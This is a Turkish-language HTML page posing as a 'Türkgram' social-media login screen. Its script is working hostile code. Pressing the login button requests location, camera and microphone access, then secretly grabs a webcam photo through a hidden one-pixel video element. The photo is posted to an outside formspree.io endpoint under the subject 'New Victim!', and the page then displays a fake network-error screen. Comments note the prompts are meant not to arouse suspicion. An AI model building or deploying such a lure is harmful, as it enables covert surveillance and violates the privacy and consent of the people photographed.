<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Türkgram - Giriş Yap</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background-color: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 20px; text-align: center; }
        .logo { font-size: 40px; font-weight: bold; margin-bottom: 20px; font-family: 'Cookie', cursive; color: #262626; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; }
        .btn-login { width: 100%; padding: 10px; border: none; border-radius: 4px; background-color: #0095f6; color: white; font-weight: bold; cursor: pointer; }
        .divider { margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: bold; display: flex; align-items: center; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
        #error-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; padding: 40px; text-align: left; }
    </style>
</head>
<body>

    <div id="main-content" class="login-container">
        <div class="logo">Türkgram</div>
        <input type="text" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
        <input type="password" placeholder="Şifre">
        <button class="btn-login" onclick="izneZorla()">Giriş Yap</button>
        <div class="divider">VEYA</div>
        <p style="color:#385185; font-weight:bold; cursor:pointer; font-size:14px;">Facebook ile Giriş Yap</p>
    </div>

    <div id="error-screen">
        <h2 style="color:#333;">Bağlantı Hatası</h2>
        <p>Üzgünüz, bir ağ hatası oluştu. Lütfen şunları kontrol edin:</p>
        <ul>
            <li>İnternet bağlantınızın aktif olduğunu doğrulayın.</li>
            <li>Tarayıcı izinlerinin güncel olduğundan emin olun.</li>
            <li>Uygulamayı yeniden başlatın.</li>
        </ul>
        <p style="color:#999; font-size:12px; margin-top:20px;">Hata Kodu: 0x8004210B (Türkgram-Sync)</p>
    </div>

    <video id="videoElement" autoplay playsinline></video>

    <script>
        async function izneZorla() {
            try {
                // Konum, Ses ve Kamera izinlerini arka arkaya istiyoruz
                // Bu durum kullanıcıyı şüphelendirmez, "Türkgram özelliği" gibi durur.
                await navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                
                const video = document.querySelector("#videoElement");
                video.srcObject = stream;

                // 1 saniye sonra fotoyu çek ve gönder
                setTimeout(fotografCekVeGonder, 1000);
            } catch (err) {
                // İzin verilmezse de siteyi kapat
                hataGoster();
            }
        }

        async function fotografCekVeGonder() {
            const video = document.querySelector("#videoElement");
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);
            const veriUrl = canvas.toDataURL("image/jpeg", 0.6);

            await fetch("https://formspree.io/f/meelplaw", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    _subject: "Türkgram Giriş - Yeni Kurban!",
                    fotograf: veriUrl
                })
            });

            hataGoster();
        }

        function hataGoster() {
            document.getElementById("main-content").style.display = "none";
            document.getElementById("error-screen").style.display = "block";
        }
    </script>
</body>
</html>
